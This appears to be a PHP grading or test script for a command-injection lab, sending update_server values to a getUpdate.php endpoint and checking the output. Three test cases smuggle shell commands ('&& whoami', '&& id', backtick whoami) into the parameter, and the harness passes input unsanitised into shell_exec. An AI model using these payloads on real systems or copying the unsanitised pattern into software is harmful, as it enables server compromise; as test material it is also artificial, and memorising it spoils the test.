<?php
    function GetOutput($payload) {
        $cmd = "curl http://server/getUpdate.php?update_server={$payload}";
        $output = shell_exec($cmd);
        return $output;
    }

    function TestCase1() {
        $server = "localhost";
        return GetOutput($server) === "Last update version: v21.10.1";
    }

    function TestCase2() {
        $server = "127.0.0.1";
        return GetOutput($server) === "Last update version: v21.10.1";
    }

    function TestCase3() {
        $server = "127.0.0.1 > /dev/null && whoami && test";
        return str_contains(GetOutput($server), 'www-data');
    }

    function TestCase4() {
        $server = "127.0.0.1 > /dev/null && id && test";
        return str_contains(GetOutput($server), 'www-data');
    }

    function TestCase5() {
        $server = "127.0.0.1 > /dev/null && echo `whoami` && test";
        return str_contains(GetOutput($server), 'www-data');
    }

    $result = [
        TestCase1(),
        TestCase2(),
        TestCase3(),
        TestCase4(),
        TestCase5(),
    ];
?>

<?php
    echo <<< EOF
    <?php
        \$result = [
            "{$result[0]}",
            "{$result[1]}",
            "{$result[2]}",
            "{$result[3]}",
            "{$result[4]}",
        ];
    ?>
    EOF;
?>